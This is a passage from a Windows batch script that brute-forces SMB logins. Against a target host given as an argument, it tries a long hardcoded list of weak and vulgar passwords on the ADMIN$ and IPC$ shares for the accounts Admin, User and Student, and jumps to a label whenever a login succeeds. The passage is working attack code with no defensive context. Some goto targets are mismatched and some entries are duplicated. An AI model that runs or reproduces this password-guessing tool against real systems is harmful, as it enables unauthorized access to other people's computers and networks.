   if not errorlevel 1 goto Adminfootball
   net use \\%1\ADMIN$ "soccer" /user:Admin
   if not errorlevel 1 goto Adminsoccer
   net use \\%1\IPC$ "soccer" /user:Admin
   if not errorlevel 1 goto Adminsoccer
   net use \\%1\ADMIN$ "pot" /user:Admin
   if not errorlevel 1 goto Adminpot
   net use \\%1\IPC$ "pot" /user:Admin
   if not errorlevel 1 goto Adminpot
   net use \\%1\ADMIN$ "dope" /user:Admin
   if not errorlevel 1 goto Admindope
   net use \\%1\IPC$ "dope" /user:Admin
   if not errorlevel 1 goto Admindope
   net use \\%1\ADMIN$ "maryjane" /user:Admin
   if not errorlevel 1 goto Adminmaryjane
   net use \\%1\IPC$ "maryjane" /user:Admin
   if not errorlevel 1 goto Adminmaryjane
   net use \\%1\ADMIN$ "marijuana" /user:Admin
   if not errorlevel 1 goto Adminmarijuana
   net use \\%1\IPC$ "marijuana" /user:Admin
   if not errorlevel 1 goto Adminmarijuana
   net use \\%1\ADMIN$ "money" /user:Admin
   if not errorlevel 1 goto Adminmoney
   net use \\%1\IPC$ "money" /user:Admin
   if not errorlevel 1 goto Adminmoney
   net use \\%1\ADMIN$ "girl" /user:Admin
   if not errorlevel 1 goto Admingirl
   net use \\%1\IPC$ "girl" /user:Admin
   if not errorlevel 1 goto Admingirl
   net use \\%1\ADMIN$ "girls" /user:Admin
   if not errorlevel 1 goto Admingirls
   net use \\%1\IPC$ "girls" /user:Admin
   if not errorlevel 1 goto Admingirls
   net use \\%1\ADMIN$ "woman" /user:Admin
   if not errorlevel 1 goto Adminwoman
   net use \\%1\IPC$ "woman" /user:Admin
   if not errorlevel 1 goto Adminwoman
   net use \\%1\ADMIN$ "women" /user:Admin
   if not errorlevel 1 goto Adminwomen
   net use \\%1\IPC$ "women" /user:Admin
   if not errorlevel 1 goto Adminwomen
   net use \\%1\ADMIN$ "female" /user:Admin
   if not errorlevel 1 goto Adminfemale
   net use \\%1\IPC$ "female" /user:Admin
   if not errorlevel 1 goto Adminfemale
   net use \\%1\ADMIN$ "america" /user:Admin
   if not errorlevel 1 goto Adminamerica
   net use \\%1\IPC$ "america" /user:Admin
   if not errorlevel 1 goto Adminamerica
   net use \\%1\ADMIN$ "usa" /user:Admin
   if not errorlevel 1 goto Adminusa
   net use \\%1\IPC$ "usa" /user:Admin
   if not errorlevel 1 goto Adminusa
   net use \\%1\ADMIN$ "god" /user:Admin
   if not errorlevel 1 goto Admingod
   net use \\%1\IPC$ "god" /user:Admin
   if not errorlevel 1 goto Admingod
   net use \\%1\ADMIN$ "jesus" /user:Admin
   if not errorlevel 1 goto Adminjesus
   net use \\%1\IPC$ "jesus" /user:Admin
   if not errorlevel 1 goto Adminjesus
   net use \\%1\ADMIN$ "technology" /user:Admin
   if not errorlevel 1 goto Admintechnology
   net use \\%1\IPC$ "technology" /user:Admin
   if not errorlevel 1 goto Admintechnology
   net use \\%1\ADMIN$ "computer" /user:Admin
   if not errorlevel 1 goto Admincomputer
   net use \\%1\IPC$ "computer" /user:Admin
   if not errorlevel 1 goto Admincomputer
   net use \\%1\ADMIN$ "porn" /user:Admin
   if not errorlevel 1 goto Adminporn
   net use \\%1\IPC$ "porn" /user:Admin
   if not errorlevel 1 goto Adminporn
   net use \\%1\ADMIN$ "clock" /user:Admin
   if not errorlevel 1 goto Adminclock
   net use \\%1\IPC$ "clock" /user:Admin
   if not errorlevel 1 goto Adminclock
   net use \\%1\ADMIN$ "church" /user:Admin
   if not errorlevel 1 goto Adminchurch
   net use \\%1\IPC$ "church" /user:Admin
   if not errorlevel 1 goto Adminchurch
   net use \\%1\ADMIN$ "church" /user:Admin
   if not errorlevel 1 goto Adminchurch
   net use \\%1\IPC$ "church" /user:Admin
   if not errorlevel 1 goto Adminchurch
   net use \\%1\ADMIN$ "temp" /user:Admin
   if not errorlevel 1 goto Admintemp
   net use \\%1\IPC$ "temp" /user:Admin
   if not errorlevel 1 goto Admintemp
   net use \\%1\ADMIN$ "" /user:User
   if not errorlevel 1 goto User
   net use \\%1\IPC$ "" /user:User
   if not errorlevel 1 goto User
   net use \\%1\ADMIN$ "pass123" /user:User
   if not errorlevel 1 goto Userpass123
   net use \\%1\IPC$ "pass123" /user:User
   if not errorlevel 1 goto Administratorpass123
   net use \\%1\ADMIN$ "something" /user:User
   if not errorlevel 1 goto Usersomething
   net use \\%1\IPC$ "something" /user:User
   if not errorlevel 1 goto Usersomething
   net use \\%1\ADMIN$ "mypass" /user:User
   if not errorlevel 1 goto Usermypass
   net use \\%1\IPC$ "mypass" /user:User
   if not errorlevel 1 goto Usermypass
   net use \\%1\ADMIN$ "login" /user:User
   if not errorlevel 1 goto Userlogin
   net use \\%1\IPC$ "login" /user:User
   if not errorlevel 1 goto Userlogin
   net use \\%1\ADMIN$ "access" /user:User
   if not errorlevel 1 goto Useraccess
   net use \\%1\IPC$ "access" /user:User
   if not errorlevel 1 goto Useraccess
   net use \\%1\ADMIN$ "password" /user:User
   if not errorlevel 1 goto Userpassword
   net use \\%1\IPC$ "password" /user:User
   if not errorlevel 1 goto Userpassword
   net use \\%1\ADMIN$ "matrix" /user:User
   if not errorlevel 1 goto Usermatrix
   net use \\%1\IPC$ "matrix" /user:User
   if not errorlevel 1 goto Usermatrix
   net use \\%1\ADMIN$ "security" /user:User
   if not errorlevel 1 goto Usersecurity
   net use \\%1\IPC$ "security" /user:User
   if not errorlevel 1 goto Usersecurity
   net use \\%1\ADMIN$ "success" /user:User
   if not errorlevel 1 goto Usersuccess
   net use \\%1\IPC$ "success" /user:User
   if not errorlevel 1 goto Usersuccess
   net use \\%1\ADMIN$ "special" /user:User
   if not errorlevel 1 goto Userspecial
   net use \\%1\IPC$ "special" /user:User
   if not errorlevel 1 goto Userspecial
   net use \\%1\ADMIN$ "ultra" /user:User
   if not errorlevel 1 goto Userultra
   net use \\%1\IPC$ "ultra" /user:User
   if not errorlevel 1 goto Userultra
   net use \\%1\ADMIN$ "pass" /user:User
   if not errorlevel 1 goto Userpass
   net use \\%1\IPC$ "pass" /user:User
   if not errorlevel 1 goto Userpass
   net use \\%1\ADMIN$ "enable" /user:User
   if not errorlevel 1 goto Userenable
   net use \\%1\IPC$ "enable" /user:User
   if not errorlevel 1 goto Userenable
   net use \\%1\ADMIN$ "passwd" /user:User
   if not errorlevel 1 goto Userpasswd
   net use \\%1\IPC$ "passwd" /user:User
   if not errorlevel 1 goto Userpasswd
   net use \\%1\ADMIN$ "password" /user:User
   if not errorlevel 1 goto Userpassword
   net use \\%1\IPC$ "password" /user:User
   if not errorlevel 1 goto Userpassword
   net use \\%1\ADMIN$ "internet" /user:User
   if not errorlevel 1 goto Userinternet
   net use \\%1\IPC$ "internet" /user:User
   if not errorlevel 1 goto Userinternet
   net use \\%1\ADMIN$ "network" /user:User
   if not errorlevel 1 goto Usernetwork
   net use \\%1\IPC$ "network" /user:User
   if not errorlevel 1 goto Usernetwork
   net use \\%1\ADMIN$ "edu" /user:User
   if not errorlevel 1 goto Useredu
   net use \\%1\IPC$ "edu" /user:User
   if not errorlevel 1 goto Useredu
   net use \\%1\ADMIN$ "owner" /user:User
   if not errorlevel 1 goto Userowner
   net use \\%1\IPC$ "owner" /user:User
   if not errorlevel 1 goto Userowner
   net use \\%1\ADMIN$ "local" /user:User
   if not errorlevel 1 goto Userlocal
   net use \\%1\IPC$ "local" /user:User
   if not errorlevel 1 goto Userlocal
   net use \\%1\ADMIN$ "remote" /user:User
   if not errorlevel 1 goto Userremote
   net use \\%1\IPC$ "remote" /user:User
   if not errorlevel 1 goto Userremote
   net use \\%1\ADMIN$ "lan" /user:User
   if not errorlevel 1 goto Userlan
   net use \\%1\IPC$ "lan" /user:User
   if not errorlevel 1 goto Userlan
   net use \\%1\ADMIN$ "root" /user:User
   if not errorlevel 1 goto Userroot
   net use \\%1\IPC$ "root" /user:User
   if not errorlevel 1 goto Userroot
   net use \\%1\ADMIN$ "bitch" /user:User
   if not errorlevel 1 goto Userbitch
   net use \\%1\IPC$ "bitch" /user:User
   if not errorlevel 1 goto Userbitch
   net use \\%1\ADMIN$ "fault" /user:User
   if not errorlevel 1 goto Userfault
   net use \\%1\IPC$ "fault" /user:User
   if not errorlevel 1 goto Userfault
   net use \\%1\ADMIN$ "cat" /user:User
   if not errorlevel 1 goto Usercat
   net use \\%1\IPC$ "cat" /user:User
   if not errorlevel 1 goto Usercat
   net use \\%1\ADMIN$ "911" /user:User
   if not errorlevel 1 goto User911
   net use \\%1\IPC$ "911" /user:User
   if not errorlevel 1 goto User911
   net use \\%1\ADMIN$ "towers" /user:User
   if not errorlevel 1 goto Usertowers
   net use \\%1\IPC$ "towers" /user:User
   if not errorlevel 1 goto Usertowers
   net use \\%1\ADMIN$ "123" /user:User
   if not errorlevel 1 goto User123
   net use \\%1\IPC$ "123" /user:User
   if not errorlevel 1 goto User123
   net use \\%1\ADMIN$ "1234" /user:User
   if not errorlevel 1 goto User1234
   net use \\%1\IPC$ "1234" /user:User
   if not errorlevel 1 goto User1234
   net use \\%1\ADMIN$ "12345" /user:User
   if not errorlevel 1 goto User12345
   net use \\%1\IPC$ "12345" /user:User
   if not errorlevel 1 goto User12345
   net use \\%1\ADMIN$ "123456" /user:User
   if not errorlevel 1 goto User123456
   net use \\%1\IPC$ "123456" /user:User
   if not errorlevel 1 goto User123456
   net use \\%1\ADMIN$ "654321" /user:User
   if not errorlevel 1 goto User654321
   net use \\%1\IPC$ "654321" /user:User
   if not errorlevel 1 goto User654321
   net use \\%1\ADMIN$ "54321" /user:User
   if not errorlevel 1 goto User54321
   net use \\%1\IPC$ "54321" /user:User
   if not errorlevel 1 goto User54321
   net use \\%1\ADMIN$ "4321" /user:User
   if not errorlevel 1 goto User4321
   net use \\%1\IPC$ "4321" /user:User
   if not errorlevel 1 goto User4321
   net use \\%1\ADMIN$ "321" /user:User
   if not errorlevel 1 goto User321
   net use \\%1\IPC$ "321" /user:User
   if not errorlevel 1 goto User321
   net use \\%1\ADMIN$ "student" /user:User
   if not errorlevel 1 goto Userstudent
   net use \\%1\IPC$ "student" /user:User
   if not errorlevel 1 goto Userstudent
   net use \\%1\ADMIN$ "user" /user:User
   if not errorlevel 1 goto Useruser
   net use \\%1\IPC$ "user" /user:User
   if not errorlevel 1 goto Useruser
   net use \\%1\ADMIN$ "bootie" /user:User
   if not errorlevel 1 goto Userbootie
   net use \\%1\IPC$ "bootie" /user:User
   if not errorlevel 1 goto Userbootie
   net use \\%1\ADMIN$ "poop" /user:User
   if not errorlevel 1 goto Userpoop
   net use \\%1\IPC$ "poop" /user:User
   if not errorlevel 1 goto Userpoop
   net use \\%1\ADMIN$ "poopie" /user:User
   if not errorlevel 1 goto Userpoopie
   net use \\%1\IPC$ "poopie" /user:User
   if not errorlevel 1 goto Userpoopie
   net use \\%1\ADMIN$ "weed" /user:User
   if not errorlevel 1 goto Userweed
   net use \\%1\IPC$ "weed" /user:User
   if not errorlevel 1 goto Userweed
   net use \\%1\ADMIN$ "water" /user:User
   if not errorlevel 1 goto Userwater
   net use \\%1\IPC$ "water" /user:User
   if not errorlevel 1 goto Userwater
   net use \\%1\ADMIN$ "cool" /user:User
   if not errorlevel 1 goto Usercool
   net use \\%1\IPC$ "cool" /user:User
   if not errorlevel 1 goto Usercool
   net use \\%1\ADMIN$ "joint" /user:User
   if not errorlevel 1 goto Userjoint
   net use \\%1\IPC$ "joint" /user:User
   if not errorlevel 1 goto Userjoint
   net use \\%1\ADMIN$ "crack" /user:User
   if not errorlevel 1 goto Usercrack
   net use \\%1\IPC$ "crack" /user:User
   if not errorlevel 1 goto Usercrack
   net use \\%1\ADMIN$ "danger" /user:User
   if not errorlevel 1 goto Userdanger
   net use \\%1\IPC$ "danger" /user:User
   if not errorlevel 1 goto Userdanger
   net use \\%1\ADMIN$ "weiner" /user:User
   if not errorlevel 1 goto Userweiner
   net use \\%1\IPC$ "weiner" /user:User
   if not errorlevel 1 goto Userweiner
   net use \\%1\ADMIN$ "electrical" /user:User
   if not errorlevel 1 goto Userelectrical
   net use \\%1\IPC$ "electrical" /user:User
   if not errorlevel 1 goto Userelectrical
   net use \\%1\ADMIN$ "electric" /user:User
   if not errorlevel 1 goto Userelectric
   net use \\%1\IPC$ "electric" /user:User
   if not errorlevel 1 goto Userelectric
   net use \\%1\ADMIN$ "electricity" /user:User
   if not errorlevel 1 goto Userelectricity
   net use \\%1\IPC$ "electricity" /user:User
   if not errorlevel 1 goto Userelectricity
   net use \\%1\ADMIN$ "penis" /user:User
   if not errorlevel 1 goto Userpenis
   net use \\%1\IPC$ "penis" /user:User
   if not errorlevel 1 goto Userpenis
   net use \\%1\ADMIN$ "cent" /user:User
   if not errorlevel 1 goto Usercent
   net use \\%1\IPC$ "cent" /user:User
   if not errorlevel 1 goto Usercent
   net use \\%1\ADMIN$ "50cent" /user:User
   if not errorlevel 1 goto User50cent
   net use \\%1\IPC$ "50cent" /user:User
   if not errorlevel 1 goto User50cent
   net use \\%1\ADMIN$ "eminem" /user:User
   if not errorlevel 1 goto Usereminem
   net use \\%1\IPC$ "eminem" /user:User
   if not errorlevel 1 goto Usereminem
   net use \\%1\ADMIN$ "vagina" /user:User
   if not errorlevel 1 goto Uservagina
   net use \\%1\IPC$ "vagina" /user:User
   if not errorlevel 1 goto Uservagina
   net use \\%1\ADMIN$ "cunt" /user:User
   if not errorlevel 1 goto Usercunt
   net use \\%1\IPC$ "cunt" /user:User
   if not errorlevel 1 goto Usercunt
   net use \\%1\ADMIN$ "pussy" /user:User
   if not errorlevel 1 goto Userpussy
   net use \\%1\IPC$ "pussy" /user:User
   if not errorlevel 1 goto Userpussy
   net use \\%1\ADMIN$ "cock" /user:User
   if not errorlevel 1 goto Usercock
   net use \\%1\IPC$ "cock" /user:User
   if not errorlevel 1 goto Usercock
   net use \\%1\ADMIN$ "dick" /user:User
   if not errorlevel 1 goto Userdick
   net use \\%1\IPC$ "dick" /user:User
   if not errorlevel 1 goto Userdick
   net use \\%1\ADMIN$ "shithead" /user:User
   if not errorlevel 1 goto Usershithead
   net use \\%1\IPC$ "shithead" /user:User
   if not errorlevel 1 goto Usershithead
   net use \\%1\ADMIN$ "blunt" /user:User
   if not errorlevel 1 goto Userblunt
   net use \\%1\IPC$ "blunt" /user:User
   if not errorlevel 1 goto Userblunt
   net use \\%1\ADMIN$ "shotgun" /user:User
   if not errorlevel 1 goto Usershotgun
   net use \\%1\IPC$ "shotgun" /user:User
   if not errorlevel 1 goto Usershotgun
   net use \\%1\ADMIN$ "glock" /user:User
   if not errorlevel 1 goto Userglock
   net use \\%1\IPC$ "glock" /user:User
   if not errorlevel 1 goto Userglock
   net use \\%1\ADMIN$ "executable" /user:User
   if not errorlevel 1 goto Userexecutable
   net use \\%1\IPC$ "executable" /user:User
   if not errorlevel 1 goto Userexecutable
   net use \\%1\ADMIN$ "bong" /user:User
   if not errorlevel 1 goto Userbong
   net use \\%1\IPC$ "bong" /user:User
   if not errorlevel 1 goto Userbong
   net use \\%1\ADMIN$ "dildo" /user:User
   if not errorlevel 1 goto Userdildo
   net use \\%1\IPC$ "dildo" /user:User
   if not errorlevel 1 goto Userdildo
   net use \\%1\ADMIN$ "baseball" /user:User
   if not errorlevel 1 goto Userbaseball
   net use \\%1\IPC$ "baseball" /user:User
   if not errorlevel 1 goto Userbaseball
   net use \\%1\ADMIN$ "basketball" /user:User
   if not errorlevel 1 goto Userbasketball
   net use \\%1\IPC$ "basketball" /user:User
   if not errorlevel 1 goto Userbasketball
   net use \\%1\ADMIN$ "football" /user:User
   if not errorlevel 1 goto Userfootball
   net use \\%1\IPC$ "football" /user:User
   if not errorlevel 1 goto Userfootball
   net use \\%1\ADMIN$ "soccer" /user:User
   if not errorlevel 1 goto Usersoccer
   net use \\%1\IPC$ "soccer" /user:User
   if not errorlevel 1 goto Usersoccer
   net use \\%1\ADMIN$ "pot" /user:User
   if not errorlevel 1 goto Userpot
   net use \\%1\IPC$ "pot" /user:User
   if not errorlevel 1 goto Userpot
   net use \\%1\ADMIN$ "dope" /user:User
   if not errorlevel 1 goto Userdope
   net use \\%1\IPC$ "dope" /user:User
   if not errorlevel 1 goto Userdope
   net use \\%1\ADMIN$ "maryjane" /user:User
   if not errorlevel 1 goto Usermaryjane
   net use \\%1\IPC$ "maryjane" /user:User
   if not errorlevel 1 goto Usermaryjane
   net use \\%1\ADMIN$ "marijuana" /user:User
   if not errorlevel 1 goto Usermarijuana
   net use \\%1\IPC$ "marijuana" /user:User
   if not errorlevel 1 goto Usermarijuana
   net use \\%1\ADMIN$ "money" /user:User
   if not errorlevel 1 goto Usermoney
   net use \\%1\IPC$ "money" /user:User
   if not errorlevel 1 goto Usermoney
   net use \\%1\ADMIN$ "girl" /user:User
   if not errorlevel 1 goto Usergirl
   net use \\%1\IPC$ "girl" /user:User
   if not errorlevel 1 goto Usergirl
   net use \\%1\ADMIN$ "girls" /user:User
   if not errorlevel 1 goto Usergirls
   net use \\%1\IPC$ "girls" /user:User
   if not errorlevel 1 goto Usergirls
   net use \\%1\ADMIN$ "woman" /user:User
   if not errorlevel 1 goto Userwoman
   net use \\%1\IPC$ "woman" /user:User
   if not errorlevel 1 goto Userwoman
   net use \\%1\ADMIN$ "women" /user:User
   if not errorlevel 1 goto Userwomen
   net use \\%1\IPC$ "women" /user:User
   if not errorlevel 1 goto Userwomen
   net use \\%1\ADMIN$ "female" /user:User
   if not errorlevel 1 goto Userfemale
   net use \\%1\IPC$ "female" /user:User
   if not errorlevel 1 goto Userfemale
   net use \\%1\ADMIN$ "america" /user:User
   if not errorlevel 1 goto Useramerica
   net use \\%1\IPC$ "america" /user:User
   if not errorlevel 1 goto Useramerica
   net use \\%1\ADMIN$ "usa" /user:User
   if not errorlevel 1 goto Userusa
   net use \\%1\IPC$ "usa" /user:User
   if not errorlevel 1 goto Userusa
   net use \\%1\ADMIN$ "god" /user:User
   if not errorlevel 1 goto Usergod
   net use \\%1\IPC$ "god" /user:User
   if not errorlevel 1 goto Usergod
   net use \\%1\ADMIN$ "jesus" /user:User
   if not errorlevel 1 goto Userjesus
   net use \\%1\IPC$ "jesus" /user:User
   if not errorlevel 1 goto Userjesus
   net use \\%1\ADMIN$ "technology" /user:User
   if not errorlevel 1 goto Usertechnology
   net use \\%1\IPC$ "technology" /user:User
   if not errorlevel 1 goto Usertechnology
   net use \\%1\ADMIN$ "computer" /user:User
   if not errorlevel 1 goto Usercomputer
   net use \\%1\IPC$ "computer" /user:User
   if not errorlevel 1 goto Usercomputer
   net use \\%1\ADMIN$ "porn" /user:User
   if not errorlevel 1 goto Userporn
   net use \\%1\IPC$ "porn" /user:User
   if not errorlevel 1 goto Userporn
   net use \\%1\ADMIN$ "clock" /user:User
   if not errorlevel 1 goto Userclock
   net use \\%1\IPC$ "clock" /user:User
   if not errorlevel 1 goto Userclock
   net use \\%1\ADMIN$ "church" /user:User
   if not errorlevel 1 goto Userchurch
   net use \\%1\IPC$ "church" /user:User
   if not errorlevel 1 goto Userchurch
   net use \\%1\ADMIN$ "church" /user:User
   if not errorlevel 1 goto Userchurch
   net use \\%1\IPC$ "church" /user:User
   if not errorlevel 1 goto Userchurch
   net use \\%1\ADMIN$ "temp" /user:User
   if not errorlevel 1 goto Usertemp
   net use \\%1\IPC$ "temp" /user:User
   if not errorlevel 1 goto Usertemp
   net use \\%1\ADMIN$ "" /user:Student
   if not errorlevel 1 goto Student
   net use \\%1\IPC$ "" /user:Student
   if not errorlevel 1 goto Student
   net use \\%1\ADMIN$ "pass123" /user:Student
   if not errorlevel 1 goto Studentpass123
   net use \\%1\IPC$ "pass123" /user:Student
   if not errorlevel 1 goto Administratorpass123
   net use \\%1\ADMIN$ "something" /user:Student
   if not errorlevel 1 goto Studentsomething
   net use \\%1\IPC$ "something" /user:Student
   if not errorlevel 1 goto Studentsomething
   net use \\%1\ADMIN$ "mypass" /user:Student
   if not errorlevel 1 goto Studentmypass
   net use \\%1\IPC$ "mypass" /user:Student
   if not errorlevel 1 goto Studentmypass
   net use \\%1\ADMIN$ "login" /user:Student
   if not errorlevel 1 goto Studentlogin
   net use \\%1\IPC$ "login" /user:Student
   if not errorlevel 1 goto Studentlogin
   net use \\%1\ADMIN$ "access" /user:Student
   if not errorlevel 1 goto Studentaccess
   net use \\%1\IPC$ "access" /user:Student
   if not errorlevel 1 goto Studentaccess
   net use \\%1\ADMIN$ "password" /user:Student
   if not errorlevel 1 goto Studentpassword
   net use \\%1\IPC$ "password" /user:Student
   if not errorlevel 1 goto Studentpassword
   net use \\%1\ADMIN$ "matrix" /user:Student
   if not errorlevel 1 goto Studentmatrix
   net use \\%1\IPC$ "matrix" /user:Student
   if not errorlevel 1 goto Studentmatrix
   net use \\%1\ADMIN$ "security" /user:Student
   if not errorlevel 1 goto Studentsecurity
   net use \\%1\IPC$ "security" /user:Student
   if not errorlevel 1 goto Studentsecurity
   net use \\%1\ADMIN$ "success" /user:Student
   if not errorlevel 1 goto Studentsuccess
   net use \\%1\IPC$ "success" /user:Student
   if not errorlevel 1 goto Studentsuccess
   net use \\%1\ADMIN$ "special" /user:Student
   if not errorlevel 1 goto Studentspecial
   net use \\%1\IPC$ "special" /user:Student
   if not errorlevel 1 goto Studentspecial
   net use \\%1\ADMIN$ "ultra" /user:Student
   if not errorlevel 1 goto Studentultra
   net use \\%1\IPC$ "ultra" /user:Student
   if not errorlevel 1 goto Studentultra
   net use \\%1\ADMIN$ "pass" /user:Student
   if not errorlevel 1 goto Studentpass
   net use \\%1\IPC$ "pass" /user:Student
   if not errorlevel 1 goto Studentpass
   net use \\%1\ADMIN$ "enable" /user:Student
   if not errorlevel 1 goto Studentenable
   net use \\%1\IPC$ "enable" /user:Student
   if not errorlevel 1 goto Studentenable
   net use \\%1\ADMIN$ "passwd" /user:Student
   if not errorlevel 1 goto Studentpasswd
   net use \\%1\IPC$ "passwd" /user:Student
   if not errorlevel 1 goto Studentpasswd
   net use \\%1\ADMIN$ "password" /user:Student
   if not errorlevel 1 goto Studentpassword
   net use \\%1\IPC$ "password" /user:Student
   if not errorlevel 1 goto Studentpassword
   net use \\%1\ADMIN$ "internet" /user:Student
   if not errorlevel 1 goto Studentinternet
   net use \\%1\IPC$ "internet" /user:Student
   if not errorlevel 1 goto Studentinternet
   net use \\%1\ADMIN$ "network" /user:Student
   if not errorlevel 1 goto Studentnetwork
   net use \\%1\IPC$ "network" /user:Student
   if not errorlevel 1 goto Studentnetwork
   net use \\%1\ADMIN$ "edu" /user:Student
   if not errorlevel 1 goto Studentedu
   net use \\%1\IPC$ "edu" /user:Student
   if not errorlevel 1 goto Studentedu
   net use \\%1\ADMIN$ "owner" /user:Student
   if not errorlevel 1 goto Studentowner
   net use \\%1\IPC$ "owner" /user:Student
   if not errorlevel 1 goto Studentowner
   net use \\%1\ADMIN$ "local" /user:Student
   if not errorlevel 1 goto Studentlocal
   net use \\%1\IPC$ "local" /user:Student
   if not errorlevel 1 goto Studentlocal
   net use \\%1\ADMIN$ "remote" /user:Student
   if not errorlevel 1 goto Studentremote
   net use \\%1\IPC$ "remote" /user:Student
   if not errorlevel 1 goto Studentremote
   net use \\%1\ADMIN$ "lan" /user:Student
   if not errorlevel 1 goto Studentlan
   net use \\%1\IPC$ "lan" /user:Student
   if not errorlevel 1 goto Studentlan
   net use \\%1\ADMIN$ "root" /user:Student
   if not errorlevel 1 goto Studentroot
   net use \\%1\IPC$ "root" /user:Student
   if not errorlevel 1 goto Studentroot
   net use \\%1\ADMIN$ "bitch" /user:Student
   if not errorlevel 1 goto Studentbitch
   net use \\%1\IPC$ "bitch" /user:Student
   if not errorlevel 1 goto Studentbitch
   net use \\%1\ADMIN$ "fault" /user:Student
   if not errorlevel 1 goto Studentfault
   net use \\%1\IPC$ "fault" /user:Student
   if not errorlevel 1 goto Studentfault
   net use \\%1\ADMIN$ "cat" /user:Student
   if not errorlevel 1 goto Studentcat
   net use \\%1\IPC$ "cat" /user:Student
   if not errorlevel 1 goto Studentcat
   net use \\%1\ADMIN$ "911" /user:Student
   if not errorlevel 1 goto Student911
   net use \\%1\IPC$ "911" /user:Student
   if not errorlevel 1 goto Student911
   net use \\%1\ADMIN$ "towers" /user:Student
   if not errorlevel 1 goto Studenttowers
   net use \\%1\IPC$ "towers" /user:Student
   if not errorlevel 1 goto Studenttowers
   net use \\%1\ADMIN$ "123" /user:Student
   if not errorlevel 1 goto Student123
   net use \\%1\IPC$ "123" /user:Student
   if not errorlevel 1 goto Student123
   net use \\%1\ADMIN$ "1234" /user:Student
   if not errorlevel 1 goto Student1234
   net use \\%1\IPC$ "1234" /user:Student
   if not errorlevel 1 goto Student1234
   net use \\%1\ADMIN$ "12345" /user:Student
   if not errorlevel 1 goto Student12345
   net use \\%1\IPC$ "12345" /user:Student
   if not errorlevel 1 goto Student12345
   net use \\%1\ADMIN$ "123456" /user:Student
   if not errorlevel 1 goto Student123456
   net use \\%1\IPC$ "123456" /user:Student
   if not errorlevel 1 goto Student123456
   net use \\%1\ADMIN$ "654321" /user:Student
   if not errorlevel 1 goto Student654321
   net use \\%1\IPC$ "654321" /user:Student
   if not errorlevel 1 goto Student654321
   net use \\%1\ADMIN$ "54321" /user:Student
   if not errorlevel 1 goto Student54321
   net use \\%1\IPC$ "54321" /user:Student
   if not errorlevel 1 goto Student54321
   net use \\%1\ADMIN$ "4321" /user:Student
   if not errorlevel 1 goto Student4321
   net use \\%1\IPC$ "4321" /user:Student
   if not errorlevel 1 goto Student4321
   net use \\%1\ADMIN$ "321" /user:Student
   if not errorlevel 1 goto Student321
   net use \\%1\IPC$ "321" /user:Student
   if not errorlevel 1 goto Student321
   net use \\%1\ADMIN$ "student" /user:Student
   if not errorlevel 1 goto Studentstudent
   net use \\%1\IPC$ "student" /user:Student
   if not errorlevel 1 goto Studentstudent
   net use \\%1\ADMIN$ "user" /user:Student
   if not errorlevel 1 goto Studentuser
   net use \\%1\IPC$ "user" /user:Student
   if not errorlevel 1 goto Studentuser
   net use \\%1\ADMIN$ "bootie" /user:Student
   if not errorlevel 1 goto Studentbootie
   net use \\%1\IPC$ "bootie" /user:Student
   if not errorlevel 1 goto Studentbootie
   net use \\%1\ADMIN$ "poop" /user:Student
   if not errorlevel 1 goto Studentpoop
   net use \\%1\IPC$ "poop" /user:Student
   if not errorlevel 1 goto Studentpoop
   net use \\%1\ADMIN$ "poopie" /user:Student
   if not errorlevel 1 goto Studentpoopie
   net use \\%1\IPC$ "poopie" /user:Student
   if not errorlevel 1 goto Studentpoopie
   net use \\%1\ADMIN$ "weed" /user:Student
   if not errorlevel 1 goto Studentweed
   net use \\%1\IPC$ "weed" /user:Student
   if not errorlevel 1 goto Studentweed
   net use \\%1\ADMIN$ "water" /user:Student
   if not errorlevel 1 goto Studentwater
   net use \\%1\IPC$ "water" /user:Student
   if not errorlevel 1 goto Studentwater
   net use \\%1\ADMIN$ "cool" /user:Student
   if not errorlevel 1 goto Studentcool
   net use \\%1\IPC$ "cool" /user:Student
   if not errorlevel 1 goto Studentcool
   net use \\%1\ADMIN$ "joint" /user:Student
   if not errorlevel 1 goto Studentjoint
   net use \\%1\IPC$ "joint" /user:Student
   if not errorlevel 1 goto Studentjoint
   net use \\%1\ADMIN$ "crack" /user:Student
   if not errorlevel 1 goto Studentcrack
   net use \\%1\IPC$ "crack" /user:Student
   if not errorlevel 1 goto Studentcrack
   net use \\%1\ADMIN$ "danger" /user:Student
   if not errorlevel 1 goto Studentdanger
   net use \\%1\IPC$ "danger" /user:Student
   if not errorlevel 1 goto Studentdanger
   net use \\%1\ADMIN$ "weiner" /user:Student
   if not errorlevel 1 goto Studentweiner
   net use \\%1\IPC$ "weiner" /user:Student
   if not errorlevel 1 goto Studentweiner
   net use \\%1\ADMIN$ "electrical" /user:Student
   if not errorlevel 1 goto Studentelectrical
   net use \\%1\IPC$ "electrical" /user:Student
   if not errorlevel 1 goto Studentelectrical
   net use \\%1\ADMIN$ "electric" /user:Student
   if not errorlevel 1 goto Studentelectric
   net use \\%1\IPC$ "electric" /user:Student
   if not errorlevel 1 goto Studentelectric
   net use \\%1\ADMIN$ "electricity" /user:Student
   if not errorlevel 1 goto Studentelectricity
   net use \\%1\IPC$ "electricity" /user:Student
   if not errorlevel 1 goto Studentelectricity
   net use \\%1\ADMIN$ "penis" /user:Student
   if not errorlevel 1 goto Studentpenis
   net use \\%1\IPC$ "penis" /user:Student
   if not errorlevel 1 goto Studentpenis
   net use \\%1\ADMIN$ "cent" /user:Student
   if not errorlevel 1 goto Studentcent
   net use \\%1\IPC$ "cent" /user:Student
   if not errorlevel 1 goto Studentcent
   net use \\%1\ADMIN$ "50cent" /user:Student
   if not errorlevel 1 goto Student50cent
   net use \\%1\IPC$ "50cent" /user:Student
   if not errorlevel 1 goto Student50cent
   net use \\%1\ADMIN$ "eminem" /user:Student
   if not errorlevel 1 goto Studenteminem
   net use \\%1\IPC$ "eminem" /user:Student
   if not errorlevel 1 goto Studenteminem
   net use \\%1\ADMIN$ "vagina" /user:Student
   if not errorlevel 1 goto Studentvagina
   net use \\%1\IPC$ "vagina" /user:Student
   if not errorlevel 1 goto Studentvagina
   net use \\%1\ADMIN$ "cunt" /user:Student
   if not errorlevel 1 goto Studentcunt
   net use \\%1\IPC$ "cunt" /user:Student
   if not errorlevel 1 goto Studentcunt
   net use \\%1\ADMIN$ "pussy" /user:Student
   if not errorlevel 1 goto Studentpussy
   net use \\%1\IPC$ "pussy" /user:Student
   if not errorlevel 1 goto Studentpussy
   net use \\%1\ADMIN$ "cock" /user:Student
   if not errorlevel 1 goto Studentcock
   net use \\%1\IPC$ "cock" /user:Student
   if not errorlevel 1 goto Studentcock
   net use \\%1\ADMIN$ "dick" /user:Student
   if not errorlevel 1 goto Studentdick
